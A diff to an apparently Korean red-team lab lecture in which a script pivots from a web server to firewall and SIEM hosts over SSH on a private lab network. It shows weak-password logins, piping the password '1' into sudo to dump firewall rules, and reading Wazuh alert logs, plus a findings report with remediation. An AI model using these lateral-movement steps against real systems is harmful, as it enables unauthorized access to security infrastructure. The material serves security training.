@@ -20,9 +20,9 @@
 | 호스트 | IP | 역할 | 접속 |
 |--------|-----|------|------|
 | bastion | 10.20.30.201 | 공격 기지 + C2 | `ssh ccc@10.20.30.201` |
-| secu | 10.20.30.1 | 방화벽/IPS (고가치 목표) | `sshpass -p1 ssh ccc@10.20.30.1` |
-| web | 10.20.30.80 | 웹 서버 (초기 접근점) | `sshpass -p1 ssh ccc@10.20.30.80` |
-| siem | 10.20.30.100 | SIEM (최종 목표) | `sshpass -p1 ssh ccc@10.20.30.100` |
+| secu | 10.20.30.1 | 방화벽/IPS (고가치 목표) | `ssh ccc@10.20.30.1` |
+| web | 10.20.30.80 | 웹 서버 (초기 접근점) | `ssh ccc@10.20.30.80` |
+| siem | 10.20.30.100 | SIEM (최종 목표) | `ssh ccc@10.20.30.100` |
 
 ## 강의 시간 배분 (3시간)
 
@@ -193,9 +193,9 @@ for user in web secu siem; do
     echo "  [+] $user → 비밀번호 '1'로 SSH 접근 성공"
   fi
 done
-sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "ccc@10.20.30.80" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.80 → SSH 접근 성공"
-sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "ccc@10.20.30.1" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.1 → SSH 접근 성공"
-sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "ccc@10.20.30.100" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.100 → SSH 접근 성공"
+ssh "ccc@10.20.30.80" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.80 → SSH 접근 성공"
+ssh "ccc@10.20.30.1" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.1 → SSH 접근 성공"
+ssh "ccc@10.20.30.100" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.100 → SSH 접근 성공"
 
 echo ""
 echo "[취약점 5] Manager API 인증"
@@ -230,7 +230,7 @@ echo "============================================================"
 
 echo ""
 echo "[Step 1] web 서버 — 권한 상승"
-sshpass -p1 ssh ccc@10.20.30.80 "
+ssh ccc@10.20.30.80 "
   echo '--- 현재 사용자 ---'
   id
   echo '--- sudo 권한 ---'
@@ -241,8 +241,8 @@ sshpass -p1 ssh ccc@10.20.30.80 "
 
 echo ""
 echo "[Step 2] web → secu 측면 이동"
-sshpass -p1 ssh ccc@10.20.30.80 "
-  sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.1 '
+ssh ccc@10.20.30.80 "
+  ssh ccc@10.20.30.1 '
     echo \"[+] secu 접근 성공: \$(hostname)\"
     echo \"--- 방화벽 규칙 요약 ---\"
     echo 1 | sudo -S nft list ruleset 2>/dev/null | head -10
@@ -251,8 +251,8 @@ sshpass -p1 ssh ccc@10.20.30.80 "
 
 echo ""
 echo "[Step 3] web → siem 측면 이동 (최종 목표)"
-sshpass -p1 ssh ccc@10.20.30.80 "
-  sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 '
+ssh ccc@10.20.30.80 "
+  ssh ccc@10.20.30.100 '
     echo \"[+] SIEM 접근 성공: \$(hostname)\"
     echo \"--- Wazuh 알림 데이터 (최근 5건) ---\"
     tail -5 /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
@@ -326,7 +326,7 @@ cat << 'REPORT'
    위험도: Critical (CVSS 9.1)
    위치: 전체 서버 (secu, web, siem)
    영향: 전체 네트워크 접근, 측면 이동
-   재현: sshpass -p1 ssh user@target
+   재현: sshpass -p1 ssh ccc@target
    권고: SSH 키 인증 전환, 비밀번호 복잡도 정책
 
    [VULN-003] 민감 API 무인증 접근
